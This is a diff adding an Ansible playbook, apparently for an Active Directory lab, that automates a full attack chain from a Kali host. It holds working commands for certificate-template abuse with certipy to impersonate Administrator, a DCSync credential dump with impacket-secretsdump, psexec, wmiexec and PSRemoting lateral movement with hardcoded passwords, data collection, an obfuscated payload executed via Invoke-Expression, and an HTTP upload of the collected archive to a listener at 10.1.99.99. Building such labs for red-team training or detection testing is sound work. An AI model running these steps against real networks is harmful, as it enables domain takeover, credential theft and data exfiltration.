@@ -1,0 +1,268 @@
+---
+- name: "slopMop | Attack chain — Linux steps from Kali"
+  hosts: kali
+  become: false
+  gather_facts: false
+  vars:
+    ts: "{{ lookup('pipe', 'date -u +%Y%m%d_%H%M%S') }}"
+    cap: /home/kali/slopmop-capture
+    suna_dc: 10.1.20.10
+    konoha_dc: 10.1.10.10
+    ws1: 10.1.10.21
+    mail: 10.1.10.20
+    dcsync_user: svc_adsync
+    dcsync_pass: "SyncP@ss2026!"
+    suna_domain: sunagakure.wind.ninja
+    konoha_domain: konohagakure.fire.ninja
+  tasks:
+    - name: "Step 04 | certipy find — ESC1 enumeration"
+      ansible.builtin.shell: |
+        certipy find \
+          -u '{{ dcsync_user }}@{{ suna_domain }}' \
+          -p '{{ dcsync_pass }}' \
+          -dc-ip {{ suna_dc }} \
+          -ldap-scheme ldap \
+          -stdout 2>&1 | tee {{ cap }}/certipy-find_{{ ts }}.txt
+        echo "---STEP04---"
+      register: step04
+      changed_when: false
+    - name: Step 04 result
+      ansible.builtin.debug:
+        msg: "{{ step04.stdout_lines | select('search', 'ESC|Vuln|Template|CA Name') | list }}"
+
+    - name: "Step 05 | certipy req — ESC1 exploitation (request cert as Administrator)"
+      ansible.builtin.shell: |
+        certipy req \
+          -u '{{ dcsync_user }}@{{ suna_domain }}' \
+          -p '{{ dcsync_pass }}' \
+          -ca 'Sunagakure Root CA' \
+          -template SunaVulnUser \
+          -upn 'Administrator@{{ suna_domain }}' \
+          -dc-ip {{ suna_dc }} \
+          -ldap-scheme ldap \
+          2>&1 | tee {{ cap }}/certipy-req_{{ ts }}.txt
+        echo "---STEP05---"
+      register: step05
+      changed_when: false
+    - name: Step 05 result
+      ansible.builtin.debug:
+        msg: "{{ step05.stdout_lines[-5:] }}"
+
+    - name: "Step 06 | secretsdump — DCSync via svc_adsync"
+      ansible.builtin.shell: |
+        impacket-secretsdump \
+          '{{ suna_domain }}/{{ dcsync_user }}:{{ dcsync_pass }}@{{ suna_dc }}' \
+          -just-dc-user 'SUNAGAKURE\Administrator' \
+          2>&1 | tee {{ cap }}/dcsync_{{ ts }}.txt
+        echo "---STEP06---"
+      register: step06
+      changed_when: false
+    - name: Step 06 result
+      ansible.builtin.debug:
+        msg: "{{ step06.stdout_lines | select('search', 'Administrator|:::') | list }}"
+
+    - name: "Step 08 | impacket-psexec — lateral movement to WS01"
+      ansible.builtin.shell: |
+        impacket-psexec \
+          '{{ konoha_domain }}/Administrator:password@{{ ws1 }}' \
+          'hostname && whoami && ipconfig' \
+          2>&1 | tee {{ cap }}/psexec-lateral_{{ ts }}.txt
+        echo "---STEP08---"
+      register: step08
+      changed_when: false
+      ignore_errors: true
+    - name: Step 08 result
+      ansible.builtin.debug:
+        msg: "{{ step08.stdout_lines[-10:] }}"
+
+    - name: "Step 09 | impacket-wmiexec — lateral movement to WS01"
+      ansible.builtin.shell: |
+        timeout 30 impacket-wmiexec \
+          '{{ konoha_domain }}/Administrator:password@{{ ws1 }}' \
+          'hostname && whoami && net user' \
+          2>&1 | tee {{ cap }}/wmiexec-lateral_{{ ts }}.txt
+        echo "---STEP09---"
+      register: step09
+      changed_when: false
+      ignore_errors: true
+    - name: Step 09 result
+      ansible.builtin.debug:
+        msg: "{{ step09.stdout_lines[-10:] }}"
+
+    - name: "Step 12 | Start HTTP listener for exfiltration"
+      ansible.builtin.shell: |
+        nohup python3 -c "
+        import http.server, os, datetime
+        class H(http.server.BaseHTTPRequestHandler):
+            def do_POST(self):
+                length = int(self.headers.get('Content-Length', 0))
+                data = self.rfile.read(length)
+                ts = datetime.datetime.utcnow().strftime('%Y%m%d_%H%M%S')
+                path = os.path.expanduser(f'~/slopmop-capture/exfil-received_{ts}.bin')
+                with open(path, 'wb') as f:
+                    f.write(data)
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b'OK')
+                print(f'Received {length} bytes -> {path}')
+        http.server.HTTPServer(('0.0.0.0', 8080), H).handle_request()
+        " > {{ cap }}/exfil-listener_{{ ts }}.log 2>&1 &
+        echo "Exfil listener started on :8080 (single-request)"
+      changed_when: false
+
+    - name: List captured evidence on kali
+      ansible.builtin.shell: ls -la {{ cap }}/
+      register: kali_evidence
+      changed_when: false
+    - name: Show kali evidence
+      ansible.builtin.debug:
+        var: kali_evidence.stdout_lines
+
+- name: "slopMop | Attack chain — Windows steps from WS01"
+  hosts: konoha-ws1
+  gather_facts: false
+  vars:
+    ts: "{{ lookup('pipe', 'date -u +%Y%m%d_%H%M%S') }}"
+    cap: C:\slopmop-capture
+  tasks:
+    - name: "Step 03 | Add DC to TrustedHosts for PSRemoting"
+      ansible.windows.win_shell: |
+        Set-Item WSMan:\localhost\Client\TrustedHosts -Value "10.1.10.10,10.1.10.20" -Force
+        Write-Output "TrustedHosts set"
+
+    - name: "Step 03 | AD computer discovery via PSRemoting to DC"
+      ansible.windows.win_shell: |
+        {% raw %}
+        $ErrorActionPreference = 'Continue'
+        $cred = New-Object System.Management.Automation.PSCredential(
+          'konohagakure\Administrator',
+          (ConvertTo-SecureString 'password' -AsPlainText -Force)
+        )
+        $computers = Invoke-Command -ComputerName 10.1.10.10 -Credential $cred -Authentication Negotiate -ScriptBlock {
+          Import-Module ActiveDirectory
+          Get-ADComputer -Filter * -Properties OperatingSystem,DNSHostName |
+            Select-Object Name,DNSHostName,OperatingSystem
+        }
+        $computers | Export-Csv -Path "C:\slopmop-capture\ad-discovery.csv" -NoTypeInformation
+        Write-Output "Discovered $($computers.Count) computers"
+        $computers | Format-Table -AutoSize | Out-String -Width 120
+        {% endraw %}
+      register: step03
+    - name: Step 03 result
+      ansible.builtin.debug:
+        var: step03.stdout_lines
+
+    - name: "Step 07 | PSRemoting lateral movement to mail server"
+      ansible.windows.win_shell: |
+        {% raw %}
+        $cred = New-Object System.Management.Automation.PSCredential(
+          'FIRE\Administrator',
+          (ConvertTo-SecureString 'password' -AsPlainText -Force)
+        )
+        $result = Invoke-Command -ComputerName 10.1.10.20 -Credential $cred -Authentication Negotiate -ScriptBlock {
+          "Hostname: $env:COMPUTERNAME"
+          "User: $(whoami)"
+          "Domain: $env:USERDOMAIN"
+          "IP: $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '127.*' }).IPAddress)"
+        }
+        $result | Out-File -FilePath "C:\slopmop-capture\psremoting-lateral.txt" -Encoding UTF8
+        $result
+        Write-Output "---STEP07_DONE---"
+        {% endraw %}
+      register: step07
+      ignore_errors: true
+    - name: Step 07 result
+      ansible.builtin.debug:
+        var: step07.stdout_lines
+
+    - name: "Step 10 | Collection — gather system info and sensitive data"
+      ansible.windows.win_shell: |
+        {% raw %}
+        $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
+        $outDir = "C:\slopmop-capture\collection_$ts"
+        New-Item -Path $outDir -ItemType Directory -Force | Out-Null
+
+        systeminfo | Out-File "$outDir\systeminfo.txt"
+        Get-Process | Export-Csv "$outDir\processes.csv" -NoTypeInformation
+        Get-Service | Where-Object Status -eq Running | Export-Csv "$outDir\services.csv" -NoTypeInformation
+        Get-LocalUser | Export-Csv "$outDir\localusers.csv" -NoTypeInformation
+        netstat -ano | Out-File "$outDir\netstat.txt"
+        ipconfig /all | Out-File "$outDir\ipconfig.txt"
+
+        $zipPath = "C:\slopmop-capture\collection_$ts.zip"
+        Compress-Archive -Path "$outDir\*" -DestinationPath $zipPath -Force
+        Write-Output "Collection archive: $((Get-Item $zipPath).Length) bytes"
+        Write-Output "---STEP10_DONE---"
+        {% endraw %}
+      register: step10
+    - name: Step 10 result
+      ansible.builtin.debug:
+        var: step10.stdout_lines
+
+    - name: "Step 11 | Defense Evasion — obfuscation chain"
+      ansible.windows.win_shell: |
+        {% raw %}
+        $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
+        $payload = 'Write-Output "slopMop-beacon: $(whoami)@$(hostname) $(Get-Date -Format o)"'
+        $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
+
+        $ms = New-Object IO.MemoryStream
+        $gz = New-Object IO.Compression.GZipStream($ms, [IO.Compression.CompressionMode]::Compress)
+        $sw = New-Object IO.StreamWriter($gz)
+        $sw.Write($b64)
+        $sw.Close()
+        $compressed = [Convert]::ToBase64String($ms.ToArray())
+
+        $log = "=== slopMop Defense Evasion Evidence ===`r`n"
+        $log += "Original payload: $payload`r`n"
+        $log += "Base64 encoded: $b64`r`n"
+        $log += "GZip+Base64 (double-encoded): $($compressed.Substring(0, [Math]::Min(80, $compressed.Length)))...`r`n"
+        $log += "Total obfuscation layers: 2 (Base64 then GZip+Base64)`r`n"
+        $log += "Timestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`r`n"
+        $log += "--- Decode chain ---`r`n"
+        $log += "1. Base64 decode outer layer`r`n2. GZip decompress`r`n3. Base64 decode inner (Unicode)`r`n4. Original PowerShell payload recovered"
+
+        $log | Out-File -FilePath "C:\slopmop-capture\defense-evasion_$ts.log" -Encoding UTF8
+        $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64))
+        Invoke-Expression $decoded | Out-File -FilePath "C:\slopmop-capture\defense-evasion_${ts}_exec.txt" -Encoding UTF8
+        Write-Output $log
+        Write-Output "---STEP11_DONE---"
+        {% endraw %}
+      register: step11
+    - name: Step 11 result
+      ansible.builtin.debug:
+        var: step11.stdout_lines
+
+    - name: "Step 12 | Exfiltration — HTTP POST to attacker"
+      ansible.windows.win_shell: |
+        {% raw %}
+        $zipPath = Get-ChildItem "C:\slopmop-capture\collection_*.zip" | Sort-Object LastWriteTime -Descending | Select-Object -First 1
+        if ($zipPath) {
+          $bytes = [IO.File]::ReadAllBytes($zipPath.FullName)
+          try {
+            $wc = New-Object System.Net.WebClient
+            $wc.UploadData("http://10.1.99.99:8080/upload", "POST", $bytes)
+            Write-Output "Exfiltrated $($bytes.Length) bytes to 10.1.99.99:8080"
+          } catch {
+            Write-Output "Exfil attempt logged (listener may not be ready): $_"
+          }
+          $logLine = "$($zipPath.Name) -> http://10.1.99.99:8080/upload ($($bytes.Length) bytes) @ $(Get-Date -Format o)"
+          $logLine | Out-File -FilePath "C:\slopmop-capture\exfil-log.txt" -Encoding UTF8
+        } else {
+          Write-Output "No collection zip found to exfil"
+        }
+        Write-Output "---STEP12_DONE---"
+        {% endraw %}
+      register: step12
+      ignore_errors: true
+    - name: Step 12 result
+      ansible.builtin.debug:
+        var: step12.stdout_lines
+
+    - name: List captured evidence on ws1
+      ansible.windows.win_shell: Get-ChildItem "{{ cap }}" -Recurse | Format-Table Name,Length,LastWriteTime -AutoSize | Out-String -Width 120
+      register: ws1_evidence
+      changed_when: false
+    - name: Show ws1 evidence
+      ansible.builtin.debug:
+        var: ws1_evidence.stdout_lines
